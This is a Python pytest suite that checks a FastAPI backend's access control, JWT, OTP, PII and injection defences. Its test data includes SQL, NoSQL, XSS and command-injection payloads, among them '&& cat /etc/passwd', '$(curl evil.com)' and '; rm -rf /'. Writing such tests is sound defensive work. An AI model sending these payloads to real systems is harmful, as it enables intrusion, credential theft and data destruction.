"""Tests for security validation (CAT-SEC)."""
import pytest
import json
import hashlib
from unittest.mock import patch


class TestSecurityValidation:
    """Test basic security checks and validation."""
    
    def test_SEC_001_sql_injection_attempts_return_422_or_safe_handling(self, client, mock_supabase_client):
        """SQL injection attempts in request parameters return 422 or are safely handled."""
        # Attempt SQL injection in notice ID parameter 
        malicious_id = "12345678-1234-1234-1234-123456789abc'; DROP TABLE notices; --"
        
        response = client.get(f"/api/notices/{malicious_id}")
        
        # Should be handled safely - either validation error or safe 404
        assert response.status_code in [404, 422]
        data = response.json()
        assert "detail" in data
        # Response should not contain SQL-related errors that indicate execution
        assert "sql" not in data["detail"].lower()
        assert "database" not in data["detail"].lower()
        assert "syntax error" not in data["detail"].lower()
        # The key point: SQL injection should not be executed, just reflected safely in error message
        # This is a common pattern where the ID is echoed back in "not found" messages
    
    def test_SEC_002_xss_payloads_are_properly_handled(self, client, mock_supabase_client, mock_auth_admin_user, valid_auth_headers):
        """XSS payloads in request bodies are properly handled."""
        # Attempt XSS in notice content
        xss_payload = "<script>alert('xss')</script>"
        data = {
            "title": "Test Notice",
            "content": xss_payload,
            "pinned": False,
            "published": True
        }
        
        response = client.post("/api/admin/notices", json=data, headers=valid_auth_headers)
        
        # Should succeed but content should be handled safely
        assert response.status_code == 200
        result = response.json()
        assert "success" in result
        # In real implementation, XSS payload should be sanitized or escaped
    
    def test_SEC_003_oversized_request_payloads_are_rejected(self, client):
        """Oversized request payloads are rejected."""
        # Create large payload
        large_string = "A" * (5 * 1024 * 1024)  # 5MB
        data = {
            "name": "Test User",
            "phone_number": "010-1234-5678",
            "large_field": large_string
        }
        
        # Should be rejected or handled appropriately
        try:
            response = client.post("/api/otp/send", json=data, timeout=5)
            # If processed, should return appropriate error
            assert response.status_code in [413, 422, 400]
        except Exception:
            # Connection/timeout is acceptable for oversized requests
            pass
    
    def test_SEC_004_invalid_content_types_are_rejected(self, client):
        """Invalid content types are rejected."""
        # Send XML when JSON is expected
        xml_data = "<?xml version='1.0'?><root><name>test</name></root>"
        
        response = client.post(
            "/api/otp/send",
            data=xml_data,
            headers={"Content-Type": "application/xml"}
        )
        
        # Should reject non-JSON content type
        assert response.status_code in [415, 422]
        data = response.json()
        assert "detail" in data
    
    def test_SEC_005_authentication_tokens_are_properly_validated(self, client, monkeypatch):
        """Authentication tokens are properly validated."""
        # Test malformed JWT
        malformed_jwt = "invalid.jwt.token"
        
        # Mock authentication to properly reject malformed tokens
        def mock_auth_reject(credentials):
            from fastapi import HTTPException
            raise HTTPException(status_code=401, detail="Invalid token format")
        
        monkeypatch.setattr("auth.jwt.authenticate_jwt_token", mock_auth_reject)
        
        response = client.get(
            "/api/simulations",
            headers={"Authorization": f"Bearer {malformed_jwt}"}
        )
        
        assert response.status_code == 401
        data = response.json()
        assert "detail" in data
    
    def test_SEC_006_admin_endpoints_reject_non_admin_users(self, client, mock_auth_regular_user, valid_auth_headers):
        """Admin endpoints reject non-admin users."""
        # Regular user trying to access admin endpoint
        response = client.get("/api/admin/me", headers=valid_auth_headers)
        
        assert response.status_code == 403
        data = response.json()
        assert "detail" in data
        assert "admin" in data["detail"].lower()
    
    def test_SEC_007_rate_limiting_prevents_otp_abuse(self, client, mock_supabase_client, mock_otp_service):
        """Rate limiting prevents abuse of OTP endpoints."""
        data = {
            "name": "Test User", 
            "phone_number": "010-1234-5678"
        }
        
        # Add the hash for this specific user to whitelist first
        import hashlib
        normalized_phone = "01012345678"
        combined_string = f"Test User-{normalized_phone}"
        hashed_value = hashlib.sha256(combined_string.encode('utf-8')).hexdigest()
        mock_supabase_client.mock_data['whitelist'].append({'user_hash': hashed_value})
        
        # Multiple rapid requests should be successful for whitelisted user (rate limiting at OTP service level)
        responses = []
        for _ in range(5):
            response = client.post("/api/otp/send", json=data)
            responses.append(response)
        
        # Should succeed for whitelisted user
        for response in responses:
            assert response.status_code == 200
            result = response.json()
            assert "success" in result
            assert "message" in result


class TestOWASPTop10Security:
    """OWASP Top 10 comprehensive security tests."""
    
    # A01: Broken Access Control
    def test_SEC_ACCESS_001_direct_object_reference_blocked(self, client, mock_supabase_client, valid_auth_headers):
        """Users cannot access other users' simulations via direct object reference."""
        # Mock simulation data for different users
        mock_supabase_client.mock_data['simulations'] = [
            {'id': 'sim-user-a-123', 'user_id': 'user-a-456', 'plan_id': 'A'},
            {'id': 'sim-user-b-789', 'user_id': 'user-b-012', 'plan_id': 'B'}
        ]
        
        # Try to access another user's simulation
        response = client.get("/api/simulations/sim-user-b-789", headers=valid_auth_headers)
        
        # Should return 404 (not found) or 403 (forbidden) - not the actual data
        assert response.status_code in [403, 404]
        
        if response.status_code == 403:
            data = response.json()
            assert "authorized" in data["detail"].lower() or "forbidden" in data["detail"].lower()

    def test_SEC_ACCESS_002_privilege_escalation_prevention(self, client, mock_auth_regular_user, valid_auth_headers):
        """Regular users cannot escalate to admin privileges."""
        admin_endpoints = [
            "/api/admin/me",
            "/api/admin/notices",
            "/api/admin/privacy-policies"
        ]
        
        for endpoint in admin_endpoints:
            response = client.get(endpoint, headers=valid_auth_headers)
            assert response.status_code == 403
            data = response.json()
            assert "admin" in data["detail"].lower()

    def test_SEC_ACCESS_003_authentication_bypass_blocked(self, client):
        """Protected endpoints cannot be accessed without authentication."""
        protected_endpoints = [
            "/api/simulations",
            "/api/simulation/create", 
            "/api/admin/me"
        ]
        
        for endpoint in protected_endpoints:
            # Try without Authorization header
            response = client.get(endpoint)
            assert response.status_code in [401, 403]
            
            # Try with empty Bearer token
            response = client.get(endpoint, headers={"Authorization": "Bearer "})
            assert response.status_code in [401, 403]

    def test_SEC_ACCESS_004_authorization_bypass_blocked(self, client, mock_supabase_client, valid_auth_headers):
        """Valid JWT users cannot bypass authorization checks."""
        # Mock user without admin privileges
        mock_supabase_client.mock_data['admins'] = []  # Empty admin list
        
        response = client.get("/api/admin/me", headers=valid_auth_headers)
        assert response.status_code == 403
        data = response.json()
        assert "admin" in data["detail"].lower()

    def test_SEC_ACCESS_005_cors_policy_enforcement(self, client):
        """CORS policy prevents unauthorized cross-origin access."""
        malicious_origins = [
            "http://malicious-site.com",
            "https://evil.example.com",
            "http://phishing.site"
        ]
        
        for origin in malicious_origins:
            response = client.options("/api/simulations", headers={
                "Origin": origin,
                "Access-Control-Request-Method": "GET"
            })
            
            # Should not provide CORS headers for malicious origins
            cors_header = response.headers.get("Access-Control-Allow-Origin")
            assert cors_header != origin

    # A02: Cryptographic Failures
    def test_SEC_CRYPTO_001_jwt_signature_verification(self, client, monkeypatch):
        """JWT tokens with invalid signatures are rejected."""
        malformed_tokens = [
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature",
            "not.a.jwt",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJ0ZXN0In0.",  # alg: none
            "",
            "malformed-jwt-token"
        ]
        
        def mock_auth_reject(credentials):
            from fastapi import HTTPException
            raise HTTPException(status_code=401, detail="Invalid token signature")
        
        monkeypatch.setattr("auth.jwt.authenticate_jwt_token", mock_auth_reject)
        
        for token in malformed_tokens:
            response = client.get("/api/simulations", 
                                headers={"Authorization": f"Bearer {token}"})
            assert response.status_code == 401

    def test_SEC_CRYPTO_002_otp_hmac_validation(self, client, mock_supabase_client, mock_otp_service):
        """OTP codes are properly HMAC validated."""
        phone = "010-1234-5678"
        
        # Mock OTP service to validate HMAC properly
        def mock_verify_hmac(phone_num, code):
            # Simulate HMAC validation failure for obviously wrong codes
            invalid_codes = ["000000", "123456", "999999"]
            if code in invalid_codes:
                return False, 5, "Invalid OTP code"
            return True, 0, "OTP verified successfully"
        
        mock_otp_service.verify_otp = mock_verify_hmac
        
        # Test invalid codes
        invalid_codes = ["000000", "123456", "999999"]
        for code in invalid_codes:
            response = client.post("/api/otp/verify", json={
                "phone_number": phone,
                "otp_code": code
            })
            
            assert response.status_code == 200
            result = response.json()
            assert result["success"] is False

    def test_SEC_CRYPTO_003_phone_hashing_sha256(self, client, mock_supabase_client):
        """Phone numbers are properly hashed with SHA256 for whitelist lookup."""
        phone = "010-1234-5678"
        name = "Test User"
        normalized_phone = "01012345678"
        
        # Calculate expected hash
        combined_string = f"{name}-{normalized_phone}"
        expected_hash = hashlib.sha256(combined_string.encode('utf-8')).hexdigest()
        
        # Add hash to whitelist
        mock_supabase_client.mock_data['whitelist'] = [{'user_hash': expected_hash}]
        
        response = client.post("/api/otp/send", json={
            "name": name,
            "phone_number": phone
        })
        
        # Should succeed for properly hashed entry
        assert response.status_code == 200
        result = response.json()
        assert result["success"] is True
        assert "user_hash" in result
        assert len(result["user_hash"]) == 64  # SHA256 hex length

    def test_SEC_CRYPTO_004_session_token_security(self, client, valid_auth_headers):
        """Session tokens are handled securely."""
        # Test that tokens are not exposed in responses
        response = client.get("/api/simulations", headers=valid_auth_headers)
        
        if response.status_code == 200:
            response_text = response.text.lower()
            # Tokens should not be echoed back
            sensitive_patterns = ["bearer", "jwt", "token", "secret"]
            for pattern in sensitive_patterns:
                # Allow the word but not actual token values
                assert not any(len(word) > 50 and pattern in word.lower() 
                             for word in response_text.split())

    def test_SEC_CRYPTO_005_jwks_key_handling(self, client, monkeypatch):
        """JWKS key rotation and validation is handled properly."""
        def mock_auth_jwks_error(credentials):
            from fastapi import HTTPException
            raise HTTPException(status_code=401, detail="JWKS key not found or expired")
        
        monkeypatch.setattr("auth.jwt.authenticate_jwt_token", mock_auth_jwks_error)
        
        response = client.get("/api/simulations", 
                            headers={"Authorization": "Bearer expired-jwks-token"})
        assert response.status_code == 401

    # A03: Injection
    def test_SEC_INJECT_001_sql_injection_prevention(self, client):
        """SQL injection attempts are prevented."""
        sql_payloads = [
            "'; DROP TABLE simulations; --",
            "1 OR 1=1",
            "1'; UNION SELECT * FROM users--",
            "1' AND SLEEP(5)--",
            "'; EXEC xp_cmdshell('dir')--",
            "admin'--",
            "' OR 'x'='x"
        ]
        
        for payload in sql_payloads:
            # Test in notice ID parameter
            response = client.get(f"/api/notices/{payload}")
            
            # Should return 404 or 422, not 500 (which might indicate SQL error)
            assert response.status_code in [404, 422]
            
            # Response should not contain SQL error indicators
            response_text = response.text.lower()
            sql_errors = ["syntax error", "mysql", "postgresql", "sql", "database"]
            assert not any(error in response_text for error in sql_errors)

    def test_SEC_INJECT_002_nosql_injection_prevention(self, client, mock_supabase_client):
        """NoSQL injection attempts in Supabase queries are prevented."""
        nosql_payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$where": "function() { return true; }"}',
            '{"$regex": ".*"}',
            '{"$in": ["admin", "user"]}',
            '{"$or": [{"admin": true}]}',
            '{"$eval": "db.users.drop()"}',
        ]
        
        for payload in nosql_payloads:
            response = client.post("/api/otp/send", json={
                "name": payload,
                "phone_number": "010-1234-5678"
            })
            
            # Should handle malicious input gracefully
            assert response.status_code in [200, 422]
            
            # Should not expose database structure
            if response.status_code == 422:
                error_msg = response.json().get("detail", "")
                db_indicators = ["supabase", "query", "mongodb", "collection"]
                assert not any(indicator in error_msg.lower() for indicator in db_indicators)

    def test_SEC_INJECT_003_xss_prevention_notice_content(self, client, mock_supabase_client, mock_auth_admin_user, valid_auth_headers):
        """XSS payloads in notice content are handled safely."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            '"><script>alert("xss")</script>',
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "{{constructor.constructor(\"alert('xss')\")()}}",
            "<iframe src=javascript:alert('xss')></iframe>",
            "<body onload=alert('xss')>",
        ]
        
        for payload in xss_payloads:
            data = {
                "title": "Test Notice",
                "content": payload,
                "pinned": False,
                "published": True
            }
            
            response = client.post("/api/admin/notices", json=data, headers=valid_auth_headers)
            
            # Should succeed (content stored) but be safely handled on output
            assert response.status_code == 200
            result = response.json()
            assert result["success"] is True
            
            # Verify content doesn't contain unescaped script tags
            # (This test assumes backend sanitization or frontend escaping)

    def test_SEC_INJECT_004_command_injection_prevention(self, client, mock_supabase_client, valid_auth_headers):
        """Command injection in simulation parameters is prevented."""
        command_payloads = [
            "; ls -la",
            "&& cat /etc/passwd",
            "| whoami",
            "`id`",
            "$(curl evil.com)",
            "; rm -rf /",
            "&& python -c 'import os; os.system(\"ls\")'",
        ]
        
        for payload in command_payloads:
            simulation_data = {
                "plan_id": payload,  # Inject into plan_id
                "starting_company_round": 1,
                "current_company_round": 5,
                "simulation_rounds": 15,
                "scheduled_payment": {"1": 110000}
            }
            
            response = client.post("/api/simulation/create", json=simulation_data, headers=valid_auth_headers)
            
            # Should be rejected by validation or handled safely
            assert response.status_code in [200, 422]
            
            if response.status_code == 422:
                # Pydantic validation should catch invalid plan_id
                errors = response.json()["detail"]
                assert isinstance(errors, list)

    def test_SEC_INJECT_005_json_injection_prevention(self, client, mock_supabase_client, valid_auth_headers):
        """JSON injection in investment schedules is prevented."""
        json_payloads = [
            '{"__proto__": {"admin": true}}',
            '{"constructor": {"prototype": {"admin": true}}}',
            '"malicious_string"',
            'null',
            '[]',
            '{}',
            'true',
            'false',
        ]
        
        for payload in json_payloads:
            try:
                # Try to inject malicious JSON structure
                simulation_data = {
                    "plan_id": "A",
                    "starting_company_round": 1,
                    "current_company_round": 5,
                    "simulation_rounds": 15,
                    "scheduled_payment": json.loads(payload) if payload.startswith('{') else {"1": payload}
                }
                
                response = client.post("/api/simulation/create", json=simulation_data, headers=valid_auth_headers)
                
                # Should handle malformed JSON gracefully
                assert response.status_code in [200, 422]
                
            except json.JSONDecodeError:
                # Invalid JSON should be caught at parsing stage
                pass

    # A07: Authentication Failures  
    def test_SEC_AUTH_001_brute_force_protection(self, client, mock_supabase_client, mock_otp_service):
        """Brute force attacks on OTP verification are rate limited."""
        phone = "010-1234-5678"
        wrong_code = "000000"
        
        # Mock OTP service with attempt counting
        attempts = 0
        def mock_verify_with_limit(phone_num, code):
            nonlocal attempts
            attempts += 1
            if attempts > 6:
                return False, 0, "Maximum verification attempts exceeded. Please request new code."
            return False, 6 - attempts, f"Invalid code. {6 - attempts} attempts remaining"
        
        mock_otp_service.verify_otp = mock_verify_with_limit
        
        # Attempt verification multiple times beyond limit
        for i in range(8):
            response = client.post("/api/otp/verify", json={
                "phone_number": phone,
                "otp_code": wrong_code
            })
            
            assert response.status_code == 200
            result = response.json()
            
            if i < 6:
                # First 6 attempts should show remaining attempts
                assert "remaining_attempts" in result or "attempts remaining" in result["message"]
            else:
                # After limit, should be blocked
                assert result["success"] is False
                assert "exceeded" in result["message"].lower() or "maximum" in result["message"].lower()

    def test_SEC_AUTH_002_session_management(self, client, valid_auth_headers):
        """Session management security is properly implemented."""
        # Test that sessions are validated on each request
        response = client.get("/api/simulations", headers=valid_auth_headers)
        
        # Should require valid session
        if response.status_code == 401:
            data = response.json()
            assert "token" in data["detail"].lower() or "authentication" in data["detail"].lower()

    def test_SEC_AUTH_003_credential_validation(self, client):
        """Invalid credentials are properly rejected."""
        invalid_credentials = [
            {"Authorization": "Basic invalid"},
            {"Authorization": "Bearer"},
            {"Authorization": "invalid-format"},
            {"Authorization": "Bearer " + "x" * 1000},  # Oversized token
        ]
        
        for headers in invalid_credentials:
            response = client.get("/api/simulations", headers=headers)
            assert response.status_code in [401, 403]

    def test_SEC_AUTH_004_token_expiration(self, client, monkeypatch):
        """Expired tokens are properly rejected."""
        def mock_auth_expired(credentials):
            from fastapi import HTTPException
            raise HTTPException(status_code=401, detail="Token has expired")
        
        monkeypatch.setattr("auth.jwt.authenticate_jwt_token", mock_auth_expired)
        
        response = client.get("/api/simulations", 
                            headers={"Authorization": "Bearer expired-token"})
        assert response.status_code == 401
        data = response.json()
        assert "expired" in data["detail"].lower()

    def test_SEC_AUTH_005_multi_factor_bypass_prevention(self, client, mock_supabase_client):
        """Multi-factor authentication cannot be bypassed."""
        # Test that OTP verification is required even with whitelist access
        phone = "010-1234-5678"
        name = "Test User"
        
        # Add user to whitelist
        normalized_phone = "01012345678"
        user_hash = hashlib.sha256(f"{name}-{normalized_phone}".encode()).hexdigest()
        mock_supabase_client.mock_data['whitelist'] = [{'user_hash': user_hash}]
        
        # OTP send should succeed
        response = client.post("/api/otp/send", json={"name": name, "phone_number": phone})
        assert response.status_code == 200
        
        # But user should still need to verify OTP (can't bypass to OAuth directly)
        # This is enforced by the application flow, not tested here directly


class TestPIIDataProtection:
    """PII data protection and privacy security tests."""
    
    def test_SEC_PII_001_phone_number_encryption(self, client, mock_supabase_client):
        """Phone numbers are not stored in plain text."""
        phone = "010-1234-5678"
        name = "홍길동"
        
        # Add expected hash to whitelist
        normalized_phone = "01012345678"
        combined_string = f"{name}-{normalized_phone}"
        expected_hash = hashlib.sha256(combined_string.encode('utf-8')).hexdigest()
        mock_supabase_client.mock_data['whitelist'] = [{'user_hash': expected_hash}]
        
        response = client.post("/api/otp/send", json={
            "name": name,
            "phone_number": phone
        })
        
        assert response.status_code == 200
        result = response.json()
        
        # Response should contain hash, not plain phone
        if "user_hash" in result:
            assert len(result["user_hash"]) == 64  # SHA256 length
            assert phone not in result["user_hash"]
            assert name not in result["user_hash"]

    def test_SEC_PII_002_data_exposure_prevention(self, client, valid_auth_headers):
        """PII data is not exposed in API responses."""
        response = client.get("/api/simulations", headers=valid_auth_headers)
        
        if response.status_code == 200:
            response_text = response.text
            
            # Check response doesn't contain PII patterns
            pii_patterns = [
                r'010-\d{4}-\d{4}',  # Phone numbers
                r'\d{6}',            # Potential OTP codes
                r'password',         # Password fields
                r'ssn',              # SSN indicators
                r'주민등록번호',        # Korean SSN
            ]
            
            import re
            for pattern in pii_patterns:
                matches = re.findall(pattern, response_text, re.IGNORECASE)
                # Allow short numbers that aren't actually PII
                if pattern == r'\d{6}':
                    matches = [m for m in matches if len(m) == 6 and m.isdigit()]
                assert len(matches) == 0, f"Found potential PII: {matches}"

    def test_SEC_PII_003_hash_consistency(self, client, mock_supabase_client):
        """Hash generation is consistent and deterministic."""
        phone = "010-9876-5432"
        name = "테스트사용자"
        
        # Generate hash multiple times
        normalized_phone = phone.replace('-', '').replace(' ', '')
        combined_string = f"{name}-{normalized_phone}"
        
        hash1 = hashlib.sha256(combined_string.encode('utf-8')).hexdigest()
        hash2 = hashlib.sha256(combined_string.encode('utf-8')).hexdigest()
        
        # Hashes should be identical
        assert hash1 == hash2
        assert len(hash1) == 64
        
        # Add to whitelist and test
        mock_supabase_client.mock_data['whitelist'] = [{'user_hash': hash1}]
        
        response = client.post("/api/otp/send", json={
            "name": name,
            "phone_number": phone
        })
        
        assert response.status_code == 200


class TestDependencySecurity:
    """Dependency and supply chain security tests."""
    
    def test_SEC_DEP_001_known_vulnerabilities_check(self):
        """Check that dependencies don't have known critical vulnerabilities."""
        import subprocess
        import json
        from pathlib import Path
        
        # Run pip-audit to check for vulnerabilities
        backend_dir = Path(__file__).parent / "../../../"
        result = subprocess.run(
            ["pip-audit", "--format", "json", "--requirement", "requirements.txt"],
            capture_output=True,
            text=True,
            cwd=backend_dir
        )
        
        if result.returncode != 0 and result.stdout:
            try:
                vulnerabilities = json.loads(result.stdout)
                
                # Filter for high/critical vulnerabilities
                high_risk = [v for v in vulnerabilities 
                           if v.get("vulnerability", {}).get("severity") in ["HIGH", "CRITICAL"]]
                
                # Allow some vulnerabilities but flag critical ones
                assert len(high_risk) <= 2, f"Too many high/critical vulnerabilities: {high_risk}"
                
            except json.JSONDecodeError:
                # If can't parse output, just log it
                print(f"pip-audit output: {result.stdout}")

    def test_SEC_DEP_002_supabase_version_security(self):
        """Ensure Supabase client version is secure."""
        try:
            import supabase
            version = getattr(supabase, "__version__", "unknown")
            
            if version != "unknown":
                # Parse version and check it's reasonably recent
                version_parts = version.split(".")
                major = int(version_parts[0])
                minor = int(version_parts[1]) if len(version_parts) > 1 else 0
                
                # Should be 2.16.0+ for security fixes
                assert major >= 2, f"Supabase major version too old: {version}"
                if major == 2:
                    assert minor >= 16, f"Supabase minor version too old: {version}"
                    
        except ImportError:
            pytest.skip("Supabase not installed")

    def test_SEC_DEP_003_python_version_security(self):
        """Ensure Python version is secure and supported."""
        import sys
        
        # Check Python version is 3.11+ (as specified in requirements)
        major = sys.version_info.major
        minor = sys.version_info.minor
        
        assert major >= 3, f"Python version too old: {major}.{minor}"
        if major == 3:
            assert minor >= 11, f"Python 3.{minor} is below minimum required 3.11"